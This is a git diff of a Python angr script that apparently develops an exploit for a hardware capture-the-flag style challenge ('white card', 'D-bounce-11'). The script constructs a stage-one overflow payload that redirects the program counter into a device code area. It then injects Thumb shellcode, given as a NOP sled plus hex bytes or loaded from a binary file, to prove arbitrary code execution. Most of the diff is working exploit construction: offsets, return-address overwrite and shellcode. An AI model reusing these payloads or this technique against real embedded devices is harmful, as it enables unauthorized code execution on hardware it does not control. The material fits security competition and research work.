@@ -10,6 +10,7 @@ from IPython import embed
 
 import multiprocessing
 from multiprocessing import Pool
+from binascii import unhexlify
 
 WHITE_CARD_START_ADDR = 0x7fff0000-0xf
 WHITE_CARD_SZ = 16*64
@@ -509,44 +510,49 @@ class ESCAngr(object):
         self._hook_prints()
 
         st = self._get_start_state(addr, [])
+        # gets overwritten anyway
         st.regs.lr = 0x8d0
-        mgr = self.proj.factory.simgr(st)
-        #mgr.use_technique(angr.exploration_techniques.Veritesting())
-        mgr.use_technique(angr.exploration_techniques.Explorer(find=[0x876, 0x877], avoid=[0x874,0x875]))
-        st.memory.store(WHITE_CARD_START_ADDR, b"\x00"*WHITE_CARD_SZ)#st.solver.BVS('select%d' % i, 8))
 
+        mgr = self.proj.factory.simgr(st)
+
+        mgr.use_technique(angr.exploration_techniques.Explorer(find=[0x876, 0x877], avoid=[0x874,0x875]))
+        st.memory.store(WHITE_CARD_START_ADDR, b"\x00"*WHITE_CARD_SZ)
+
+        # Just returning right towards the solve function
         #target_pc = self.obj.symbols_by_name["_Z17fillChallengeHashv"].linked_addr
-        #target_pc = 0x8ae+1
-        #target_pc = WHITE_CARD_START_ADDR+0x140+2*20 # FOR TESTING IN ANGR
-        target_pc = 0x1fff976d + 0x110+2*20 # ON DEVICE CODE AREA
+
+        # DO NOT CHANGE
+        target_pc = 0x1fff976d + 0x110 # ON DEVICE CODE AREA
+        payload_offset = 0x111
         print("[+] Exploit target PC %08x" % target_pc)
 
-        payload = b"\x00"*12 + pack("<I", 12) + b"\x00\x00\x00\x00" + pack("<I", target_pc)
+        stage1 = b"\x00"*12 + pack("<I", 12) + b"\x00\x00\x00\x00" + pack("<I", target_pc)
 
         st.memory.store(WHITE_CARD_START_ADDR, b"\x00"*WHITE_CARD_SZ)
-        # for each bit that is set, read a byte from the payload
+
+        # for each bit that is set, read a byte from the payload (24 bytes)
         st.memory.store(WHITE_CARD_START_ADDR+0x100, b"\xff"*3)
-        st.memory.store(WHITE_CARD_START_ADDR+0xc0, payload)
+        st.memory.store(WHITE_CARD_START_ADDR+0xc0, stage1)
 
-
-        from binascii import unhexlify
         NOP = b"\x00\xbf"
+
         # prove code exec: still execute the challenge function with code!
-        payload2 = NOP*0x20 + unhexlify("07 20 1d 21 08 22 90 40 08 43 86 46 70 47".replace(" ",""))
+        # Starts executing from the first NOP
+        full_exec_demo = NOP*0x1 + unhexlify("07 20 1d 21 08 22 90 40 08 43 86 46 70 47".replace(" ",""))
+        full_exec_demo = NOP*0x1 + open('D-bounce-11/full_exec.bin', 'rb').read()
+
         #payload3 = NOP*0x20 + unhexlify(" 04 20 b5 21 08 22 90 40 08 43 07 1c 03 a6 30 68 03 a1 b8 47 f3 e7 00 00 00 00 34 8e ff 1f 48 41 43 4b 45 44 00".replace(" ",""))
 
         #payload4 = NOP*0x20 + unhexlify(" 07 20 4b 21 08 22 90 40 08 43 07 1c 02 a1 38 47 f6 e7 00 00 00 00 48 41 43 4b 45 44 00".replace(" ", ""))
-        payload4 = NOP*0x18 + unhexlify(" 07 20 1d 21 08 22 90 40 08 43 06 1c 04 20 b5 21 08 22 90 40 08 43 07 1c 4f 20 90 40 3f 24 20 43 48 21 00 bf b6 46 70 47".replace(" ", ""))
-        payload5 = NOP*0x18 + unhexlify(" 08 a0 06 88 06 a0 07 88 07 a0 00 68 06 a1 00 bf b8 47 b0 47 00 bf fe e7 00 00 00000000 b5 04  00 00 1d 07 34 8e ff 1f 48 41 43 4b 45 44 00".replace(" ", ""))
-	
+        #payload4 = NOP*0x18 + unhexlify(" 07 20 1d 21 08 22 90 40 08 43 06 1c 04 20 b5 21 08 22 90 40 08 43 07 1c 4f 20 90 40 3f 24 20 43 48 21 00 bf b6 46 70 47".replace(" ", ""))
+        #payload5 = NOP*0x18 + unhexlify(" 08 a0 06 88 06 a0 07 88 07 a0 00 68 06 a1 00 bf b8 47 b0 47 00 bf fe e7 00 00 00000000 b5 04  00 00 1d 07 34 8e ff 1f 48 41 43 4b 45 44 00".replace(" ", ""))
 
-        payload=payload5
-        
-        #print(len(payload4), payload4)
-        st.memory.store(WHITE_CARD_START_ADDR+0x111, payload)
+        payload = full_exec_demo
+
+        st.memory.store(WHITE_CARD_START_ADDR+payload_offset, payload)
 
         st.memory.store(0x1fff976d, b"\x00"*WHITE_CARD_SZ)
-        st.memory.store(0x1fff976d+0x111, payload)
+        st.memory.store(0x1fff976d+payload_offset, payload)
 
         st.memory.store(BUTTON_OFFSET, st.solver.BVS('button', 8))
 
